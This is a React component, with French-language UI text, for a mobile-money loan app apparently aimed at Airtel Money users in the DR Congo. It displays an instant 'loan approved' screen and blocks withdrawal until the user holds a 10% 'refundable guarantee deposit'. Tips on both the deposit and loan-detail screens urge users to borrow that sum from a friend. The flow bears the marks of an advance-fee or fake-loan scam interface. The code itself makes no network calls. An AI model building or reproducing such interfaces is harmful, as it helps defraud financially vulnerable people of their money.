import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Status.css';

export default function Status() {
  const navigate = useNavigate();
  
  const { 
    loanStatusData,
    personalDetailsData,
    authData,
    completeDeposit 
  } = useLoanApplication();
  
  const [showDeposit, setShowDeposit] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [showLoanDetails, setShowLoanDetails] = useState(false);
  const [showWithdrawWarning, setShowWithdrawWarning] = useState(false);

  const loanData = {
    approvedAmount: loanStatusData.approvedAmount || 0,
    requestedAmount: loanStatusData.requestedAmount || 0,
    monthlyPayment: loanStatusData.monthlyPayment || 0,
    loanTerm: loanStatusData.loanTerm || '12 Mois',
    interestRate: loanStatusData.interestRate || '8% APR'
  };

  const formatPhoneForServer = (phone) => {
    if (!phone) return null;
    
    let cleaned = phone.replace(/\D/g, '');
    
    if (cleaned.startsWith('243')) {
      return '+' + cleaned;
    }
    
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    return '+243' + cleaned;
  };

  const userData = {
    name: `${personalDetailsData.firstName || ''} ${personalDetailsData.lastName || ''}`.trim() || 'Utilisateur',
    accountNumber: loanStatusData.accountNumber || authData.phoneNumber?.replace(/\D/g, '').slice(-10) || 'N/A',
    requiredDeposit: loanStatusData.requiredDeposit || 0,
    totalWithBonus: loanStatusData.totalWithBonus || 0
  };

  const handleDepositFunds = () => {
    setShowDeposit(true);
    setShowWithdraw(false);
    setShowLoanDetails(false);
    setShowWithdrawWarning(false);
  };

  const handleWithdrawFunds = () => {
    if (!loanStatusData.hasDeposited) {
      setShowWithdrawWarning(true);
    } else {
      setShowWithdraw(true);
      setShowDeposit(false);
      setShowLoanDetails(false);
    }
  };

  const handleProceedWithdraw = () => {
    setShowWithdrawWarning(false);
    setShowWithdraw(true);
    setShowDeposit(false);
    setShowLoanDetails(false);
  };

  const handleCancelWithdraw = () => {
    setShowWithdrawWarning(false);
  };

  const handleBack = () => {
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowLoanDetails(false);
  };

  const handleLoanDetails = () => {
    setShowLoanDetails(true);
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowWithdrawWarning(false);
  };

  const handleCompleteDeposit = () => {
    completeDeposit();
    setShowDeposit(false);
  };

  const handleCompleteWithdraw = () => {
    setShowWithdraw(false);
  };

  const handleReturnHome = () => {
    navigate('/');
  };

  if (showWithdrawWarning) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="popup-overlay" onClick={handleCancelWithdraw}></div>

          <div className="warning-popup">
            <div className="warning-popup-content">
              <div className="warning-icon-container">
                <span className="warning-lock-icon">🔒</span>
              </div>

              <h2 className="warning-popup-title">Veuillez d'abord déposer!</h2>

              <p className="warning-popup-text">
                Vous devez déposer 10% du montant de votre prêt demandé sur votre compte Airtel Money avant de pouvoir retirer des fonds.
              </p>

              <div className="warning-popup-buttons">
                <button className="warning-cancel-btn" onClick={handleCancelWithdraw}>
                  Annuler
                </button>
                <button className="warning-deposit-btn" onClick={handleDepositFunds}>
                  Déposer Maintenant
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (showLoanDetails) {
    return (
      <div className="status-container loan-details-container">
        <div className="status-content loan-details-content">
          
          <div className="loan-details-header">
            <button className="loan-details-back-btn" onClick={handleBack}>
              ←
            </button>
            <h1 className="loan-details-page-title">Détails du Prêt</h1>
          </div>

          <div className="loan-details-modal-card">
            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">👤</span>
                <p className="loan-detail-label-text">NOM</p>
              </div>
              <p className="loan-detail-info-value">{userData.name}</p>
            </div>

            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">📱</span>
                <p className="loan-detail-label-text">COMPTE AIRTEL MONEY</p>
              </div>
              <p className="loan-detail-info-value">{userData.accountNumber}</p>
            </div>

            <div className="loan-requested-amount-box">
              <div className="loan-requested-label">
                <span className="loan-detail-info-icon">💵</span>
                <p className="loan-requested-label-text">MONTANT DU PRÊT DEMANDÉ</p>
              </div>
              <p className="loan-requested-value">${loanData.requestedAmount.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">DÉPÔT REQUIS (10%)</p>
              <p className="loan-summary-value">${userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">MONTANT TOTAL (AVEC BONUS DE 10%)</p>
              <p className="loan-summary-value">${userData.totalWithBonus.toLocaleString()}</p>
            </div>

            <div className="loan-qualified-badge-container">
              <div className="loan-qualified-badge">
                <span>✓</span>
                Qualifié
              </div>
            </div>

            <div className="loan-details-tip-box">
              <div className="loan-details-tip-header">
                <span className="loan-details-tip-icon">💡</span>
                <p className="loan-details-tip-title">Conseil</p>
              </div>
              <p className="loan-details-tip-text">
                Pour utiliser les fonds de votre prêt, assurez-vous que votre compte Airtel Money dispose d'au moins 10% du montant du prêt en dépôt. Si nécessaire, demandez à un ami de vous envoyer l'argent, puis rendez-le après qualification.
              </p>
            </div>

            <button className="loan-details-back-button" onClick={handleBack}>
              <span>←</span>
              Retour au Résumé du Prêt
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (showDeposit) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">Déposer des Fonds</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">NOM</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">COMPTE AIRTEL MONEY</p>
                  <p className="info-value">{userData.accountNumber}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💵 DÉPÔT REQUIS (10%)</p>
              <p className="deposit-amount">${userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">Instructions:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  Ouvrez votre application Airtel Money ou composez <strong>*501#</strong> sur votre téléphone.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  Sélectionnez <strong>"Envoyer de l'argent"</strong> ou <strong>"Dépôt"</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  Entrez votre numéro de compte Airtel Money: <strong>{userData.accountNumber}</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  Entrez le montant: <strong>${userData.requiredDeposit}</strong> (ou plus).
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  Confirmez la transaction et terminez le dépôt.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  Attendez le SMS de confirmation d'Airtel Money.
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">Conseil Utile</span>
              </div>
              <p className="tip-text">
                Si vous n'avez pas les 10% disponibles sur votre compte Airtel Money, demandez à un ami de vous envoyer l'argent, puis vous pourrez le renvoyer après qualification.
              </p>
            </div>

            <div className="confirmation-box">
              <span className="check-icon">✓</span>
              <p className="confirmation-text">
                <strong>Une fois le dépôt confirmé</strong>, vous pourrez utiliser les fonds de votre prêt.
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteDeposit}>
              <span className="button-check">✓</span>
              J'ai Terminé le Dépôt
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (showWithdraw) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">Retirer des Fonds</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">NOM</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">COMPTE AIRTEL MONEY</p>
                  <p className="info-value">{userData.accountNumber}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💰 SOLDE DISPONIBLE</p>
              <p className="deposit-amount">${loanData.approvedAmount.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">Instructions:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  Ouvrez votre application Airtel Money ou composez <strong>*501#</strong> sur votre téléphone.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  Sélectionnez <strong>"Retirer de l'argent"</strong> ou <strong>"Envoyer à la banque"</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  Entrez votre numéro de compte Airtel Money: <strong>{userData.accountNumber}</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  Entrez le montant que vous souhaitez retirer.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  Confirmez la transaction et terminez le retrait.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  Attendez le SMS de confirmation d'Airtel Money.
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">Conseil Utile</span>
              </div>
              <p className="tip-text">
                Vous pouvez retirer des fonds sur votre compte bancaire ou récupérer de l'argent chez n'importe quel agent Airtel Money. Des frais de transaction standard s'appliquent.
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteWithdraw}>
              <span className="button-check">✓</span>
              J'ai Terminé le Retrait
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="status-container">
      <div className="status-content">
        
        <div className="success-card">
          <div className="success-icon-container">
            <span className="success-checkmark">✓</span>
          </div>

          <h1 className="congrats-title">
            <span className="party-emoji">🎉</span>
            Félicitations!
          </h1>

          <p className="approval-text">
            Votre prêt a été <span className="approval-highlight">approuvé!</span> Les fonds seront décaissés sous peu.
          </p>

          <div className="approved-amount-section">
            <p className="approved-label">Montant Approuvé</p>
            <p className="approved-amount">${loanData.approvedAmount.toLocaleString()}</p>
          </div>

          <div className="compliance-notice">
            <div className="notice-header">
              <span className="warning-icon">⚠️</span>
              <span className="notice-title">Avis de Conformité</span>
            </div>
            <p className="notice-text">
              Votre compte Airtel Money doit être actif et maintenir un dépôt de garantie d'au moins{' '}
              <span className="notice-highlight">10% du montant de votre prêt demandé</span>. Ce dépôt est entièrement remboursable lors du remboursement réussi du prêt et aide à obtenir de meilleurs taux d'intérêt.
            </p>
          </div>
        </div>

        <div className="loan-details-card">
          <div className="details-header">
            <span className="details-icon">💳</span>
            <h2 className="details-title">Détails du Prêt</h2>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">💵</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Paiement Mensuel</p>
              <p className="detail-value">${loanData.monthlyPayment.toLocaleString()}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📅</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Durée du Prêt</p>
              <p className="detail-value">{loanData.loanTerm}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📈</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Taux d'Intérêt</p>
              <p className="detail-value">{loanData.interestRate}</p>
            </div>
          </div>
        </div>

        <div className="quick-actions-section">
          <h3 className="actions-title">Actions Rapides</h3>
          
          <div className="action-buttons">
            <button className="action-button" onClick={handleDepositFunds}>
              <span className="button-icon">💰</span>
              <span>Déposer des Fonds</span>
            </button>

            <button className="action-button" onClick={handleWithdrawFunds}>
              <span className="button-icon">💸</span>
              <span>Retirer des Fonds</span>
            </button>

            <button className="action-button" onClick={handleLoanDetails}>
              <span className="button-icon">📄</span>
              <span>Détails du Prêt</span>
            </button>
          </div>

          <div className="next-steps-box">
            <div className="next-steps-header">
              <span className="steps-icon">📱</span>
              <span className="steps-title">Prochaines Étapes:</span>
            </div>
            <p className="steps-text">
              Vous recevrez un SMS et un email avec les détails du décaissement dans les 24 heures.
            </p>
          </div>
        </div>

        <button className="return-home-button" onClick={handleReturnHome}>
          <span className="home-icon">🏠</span>
          <span>Retour à l'Accueil</span>
        </button>
      </div>
    </div>
  );
}